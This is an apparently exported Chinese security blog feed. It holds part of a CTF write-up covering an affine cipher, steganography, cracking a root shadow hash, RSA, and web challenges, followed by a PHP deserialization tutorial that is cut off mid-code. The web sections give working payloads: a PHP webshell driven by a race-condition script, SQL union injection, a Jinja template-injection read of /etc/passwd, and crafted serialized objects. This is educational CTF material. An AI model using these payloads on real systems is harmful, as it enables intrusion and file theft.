'</span>)</span><br><span class="line">    b = input(<span class="string">'input b (c = (am + b) mod 26) : '</span>)</span><br><span class="line">    plain = []</span><br><span class="line">    pwd_dic = affine(a, b)</span><br><span class="line">    print(pwd_dic)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">        plain.append(pwd_dic[i])</span><br><span class="line">    print(<span class="string">"flag is :"</span> + <span class="string">""</span>.join(plain))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/05/5be048c2c2480.png" alt="https://i.loli.net/2018/11/05/5be048c2c2480.png"></p><h3 id="colors"><a href="#colors" class="headerlink" title="colors"></a>colors</h3><p>得到七张图片，stegsolve得到</p><p><img src="https://i.loli.net/2018/11/06/5be1011b9148e.png" alt="https://i.loli.net/2018/11/06/5be1011b9148e.png"></p><p>更改每张图片高度，都能得到一串小格，应该是二进制了</p><p><img src="https://i.loli.net/2018/11/06/5be1015d2437b.png" alt="https://i.loli.net/2018/11/06/5be1015d2437b.png"></p><p>比赛时一直横着读的，没想到是竖着读，一个ASCII虽然8位，但最高位是0，这又有七张图片，所以还是太菜了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="string">'11111111010111101111'</span></span><br><span class="line">c2 = <span class="string">'11111011111110111111'</span></span><br><span class="line">c3 = <span class="string">'00001100101010110001'</span></span><br><span class="line">c4 = <span class="string">'01001010010000001101'</span></span><br><span class="line">c5 = <span class="string">'11010011011101010111'</span></span><br><span class="line">c6 = <span class="string">'10011011011010110110'</span></span><br><span class="line">c7 = <span class="string">'00111001101101111101'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    c = c1[i]+c2[i]+c3[i]+c4[i]+c5[i]+c6[i]+c7[i]</span><br><span class="line">    flag += chr(int(c,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p><code>flag{Png1n7erEs7iof}</code></p><h3 id="CrackIt"><a href="#CrackIt" class="headerlink" title="CrackIt"></a>CrackIt</h3><p>一个shadow文件，含加密的root密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7:::</span><br></pre></td></tr></table></figure><p>幸亏有工具john</p><p><img src="https://i.loli.net/2018/11/06/5be0fce37903c.png" alt="https://i.loli.net/2018/11/06/5be0fce37903c.png"></p><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="line">e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class="line"></span><br><span class="line">enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span><br></pre></td></tr></table></figure><p>工具一把梭</p><p><img src="https://i.loli.net/2018/11/05/5be04829b8f27.png" alt="https://i.loli.net/2018/11/05/5be04829b8f27.png"></p><h3 id="babyWeb"><a href="#babyWeb" class="headerlink" title="babyWeb"></a>babyWeb</h3><p>加XFF头和更改cookie的admin</p><p><img src="https://i.loli.net/2018/11/05/5be0469b3c44a.png" alt="https://i.loli.net/2018/11/05/5be0469b3c44a.png"></p><h3 id="babyWeb2"><a href="#babyWeb2" class="headerlink" title="babyWeb2"></a>babyWeb2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'here.php'</span>;</span><br><span class="line">    $key = <span class="string">'kelaibei'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">        @parse_str($id);</span><br><span class="line">        <span class="keyword">if</span> ($key[<span class="number">99</span>] != <span class="string">'aabg7XSs'</span> &amp;&amp; md5($key[<span class="number">99</span>]) == md5(<span class="string">'aabg7XSs'</span>)) &#123;</span><br><span class="line">           <span class="keyword">echo</span> $hint;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'try again'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>利用parse_str变量覆盖，paylaod:<code>?id=key[99]=QNKCDZO</code></p><p>得到upl04d50m3thing.php</p><p><img src="https://i.loli.net/2018/11/05/5be0439d8caab.png" alt="https://i.loli.net/2018/11/05/5be0439d8caab.png"></p><p>写入一句话,提交得到php文件链接，访问发现内容被更改，输出<code>Too slow!</code></p><p>利用条件竞争，先用burp的intruder开多线程访问</p><p><img src="https://i.loli.net/2018/11/05/5be044231e4b6.png" alt="https://i.loli.net/2018/11/05/5be044231e4b6.png"></p><p>再利用脚本或其他方式尝试getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">u = <span class="string">'http://47.105.148.65:29002/uploads/8af92ffefda7050707590b352dfb3cd2e03d29a6/s.php'</span></span><br><span class="line">passwd = <span class="string">'s'</span></span><br><span class="line">com = <span class="string">'ls -a'</span></span><br><span class="line">payload = &#123;passwd:<span class="string">'system(\''</span>+com+<span class="string">'\');'</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = s.post(u,payload)</span><br><span class="line">        print(<span class="string">"[+] success\n"</span>+res.text+<span class="string">"==="</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"failed"</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/05/5be044d1f3d51.png" alt="https://i.loli.net/2018/11/05/5be044d1f3d51.png"></p><h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>Search Comments:处存在sql注入</p><p><code>&#39; order by 4#</code> 出现错误</p><p><img src="https://i.loli.net/2018/11/06/5be104a33ad56.png" alt="https://i.loli.net/2018/11/06/5be104a33ad56.png"></p><p><code>http://47.105.148.65:29003/?username=&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;ctf&#39; and table_name=&#39;comment&#39;),3%23</code></p><p>得到id,username,comment</p><p>但是只能在第三个字段查询，且<code>&#39; union select 1,2,comment from comment%23</code>会出现和<code>&#39; or 1=1%23</code>一样的<code>Rendering Error.</code></p><p>出现了模版渲染错误</p><p>直接<code>&#39; union select 1,2,10%23</code>测试报 Mysql Error.错误，应该是花括号原因，不过mysql支持0x开头的16进制，以16进制传入即可</p><p><img src="https://i.loli.net/2018/11/06/5be10acb1615d.png" alt="https://i.loli.net/2018/11/06/5be10acb1615d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>能够正常读取</p><p><img src="https://i.loli.net/2018/11/06/5be10d604faf8.png" alt="https://i.loli.net/2018/11/06/5be10d604faf8.png"></p><p>尝试查看flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__[0].__subclasses__()[40](&quot;/flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>flag{c15f43da-481e-4131-84b2-e315719b989b}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="http://j0k3r.top/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="http://j0k3r.top/2018/10/23/php-unserialize/"/>
    <id>http://j0k3r.top/2018/10/23/php-unserialize/</id>
    <published>2018-10-22T16:00:00.000Z</published>
    <updated>2019-10-03T13:44:50.460Z</updated>
    
    <content type="html"><![CDATA[<p>补充了一些内容</p><a id="more"></a><p>把复杂的数据类型压缩到一个字符串中</p><p>serialize() 把变量和它们的值编码成文本形式</p><p>unserialize() 恢复原先变量 </p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><blockquote><p>unserialize() 的参数可控时，通过传入一个特意构造好的的序列化字符串，从而控制对象内部的变量甚至是函数以进行非法操作。</p></blockquote><p>序列化和反序列化demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> $y = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">'point is ('</span>.<span class="keyword">$this</span>-&gt;x.<span class="string">','</span>.<span class="keyword">$this</span>-&gt;y.<span class="string">')'</span>.<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">array</span>();</span><br><span class="line">$a[<span class="string">'id'</span>] = <span class="string">'1'</span>;</span><br><span class="line">$a[<span class="string">'name'</span>] = <span class="string">'user'</span>;</span><br><span class="line">$a[<span class="string">'pwd'</span>] = <span class="string">'123'</span>;</span><br><span class="line">var_dump($a);</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line">var_dump($b);</span><br><span class="line">$c = unserialize($b);</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">var_dump($c);</span><br><span class="line"></span><br><span class="line">$p1 = @<span class="keyword">new</span> Point();</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">$p1-&gt;show();</span><br><span class="line"><span class="keyword">echo</span>  @serialize(p1);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123; [&quot;id&quot;]=&gt; string(1) &quot;1&quot; [&quot;name&quot;]=&gt; string(4) &quot;user&quot; [&quot;pwd&quot;]=&gt; string(3) &quot;123&quot; &#125;</span><br><span class="line">string(65) &quot;a:3:&#123;s:2:&quot;id&quot;;s:1:&quot;1&quot;;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;pwd&quot;;s:3:&quot;123&quot;;&#125;&quot;</span><br><span class="line">array(3) &#123; [&quot;id&quot;]=&gt; string(1) &quot;1&quot; [&quot;name&quot;]=&gt; string(4) &quot;user&quot; [&quot;pwd&quot;]=&gt; string(3) &quot;123&quot; &#125;</span><br><span class="line">point is (1,2)</span><br><span class="line">s:2:&quot;p1&quot;;</span><br></pre></td></tr></table></figure><h3 id="0x01-利用普通变量或方法"><a href="#0x01-利用普通变量或方法" class="headerlink" title="0x01. 利用普通变量或方法"></a>0x01. 利用普通变量或方法</h3><p>貌似实验吧有一题</p><p><img src="https://i.loli.net/2018/10/23/5bcef0250913c.jpg" alt="5b5da21d2f014.jpg"></p><p>view-source有如下提示</p><p><img src="https://i.loli.net/2018/07/29/5b5da21d5ecdf.jpg" alt="39.jpg"></p><p>试了个开头为0的md5，s878926199a</p><p>得到<code>/user.php?fame=hjkleffifer</code></p><p>打开是这样</p><p><img src="https://i.loli.net/2018/07/29/5b5da21d8ebfd.jpg" alt="40.jpg"></p><p>所以说，得先把password序列化再输入，而且要求数组里的user和pass都等于’？？？‘，因为‘==’是比较运算符号，不会检查条件式的表达式的类型。  </p><p><strong><em>根据提示’成也布尔，败也布尔‘，布尔类型的true跟任意字符串在‘==’下成立，就可以构造bool型序列化的password。</em></strong></p><p>经查阅 序列化中 i代表int，a代表array，s代表string，b代表bool，数字代表个数/长度</p><p>例子：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$test = array("a"=&gt;0,"b"=&gt;0,"c"=&gt;0);</span><br><span class="line">$test2 = '';</span><br><span class="line">$test2=serialize($test);</span><br><span class="line">echo $test2; //类似a:3:&#123;s:1:"a";i:0;s:1:"b";i:0;s:1:"c";i:0;&#125;</span><br><span class="line"></span><br><span class="line">print_r(unserialize($test2));</span><br></pre></td></tr></table></figure><p>构造password<code>a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;}</code></p><p>注意<code>{}</code>前面写参数个数</p><p><img src="https://i.loli.net/2018/10/23/5bceeb84bf033.jpg" alt="41.jpg"></p><p>jarvis oj 一题</p><p>题目入口：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p><p>初始页面是个图片</p><p>查看源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> <span class="attr">width</span>=<span class="string">"100%"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>c2hpZWxkLmpwZw==经base64解码是shield.jpg</p><p>利用这点查看index.php和showimg.php的源码</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">$x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> width=<span class="string">"100%"</span>/&gt;</span><br></pre></td></tr></table></figure><p>showimg.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">$f = base64_decode($f);</span><br><span class="line"><span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">readfile($f);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php里发现shield.php，也看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意到<code>//flag is in pctf.php</code></p><p>但showimg.php里对pctf有过滤</p><p>index.php中，可以接收一个class的参数 , 通过这个参数反序列化来创建一个shield对象 , 然后再调用这个shield对象的readfile方法</p><p>即这段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">        $x = unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</span><br></pre></td></tr></table></figure><p>shield.php里有个readfile函数，使用的是对象里的file参数</p><p>即这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>所以</strong>构造一个经反序列化后，file=’pctf.php’的参数 </p><p>即构造<code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></p><p>flag</p><p><img src="https://i.loli.net/2018/07/29/5b5da2777090f.jpg" alt="1.jpg"></p><h3 id="0x02-PHP-Magic-function"><a href="#0x02-PHP-Magic-function" class="headerlink" title="0x02. PHP: Magic function"></a>0x02. PHP: Magic function</h3><blockquote><p>除利用普通变量或方法外还可以利用Magic function（魔术方法）进行反序列化攻击,有关魔术方法：<a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.magic.php</a></p></blockquote><p><code>__construct()</code>：当对象创建(new)时会自动调用，注意在<br>unserialize()时并不会自动调用</p><p><code>__destruct()</code>：对象被销毁时会自动调用</p><p><code>__sleep()</code>: serialize()时会先被调用</p><p><code>__wakeup()</code>：unserialize()时会先被调用</p><p>其他</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure><p><code>__construct()</code>与<code>__destruct()</code> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test_v1 = <span class="string">'function'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test_v1.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test_v1.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="string">'O:4:"demo":1:&#123;s:7:"test_v1";s:9:"phpinfo()";&#125;'</span>;</span><br><span class="line">unserialize($s);</span><br><span class="line"></span><br><span class="line">$demo2 = <span class="keyword">new</span> demo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">phpinfo()</span><br><span class="line"><span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function"><span class="title">function</span></span></span><br></pre></td></tr></table></figure><p><code>__sleep()</code>与<code>__wakeup()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test_v1 = <span class="string">'function'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"serialize&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"unserialize&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = serialize(<span class="keyword">new</span> demo());</span><br><span class="line">$s = <span 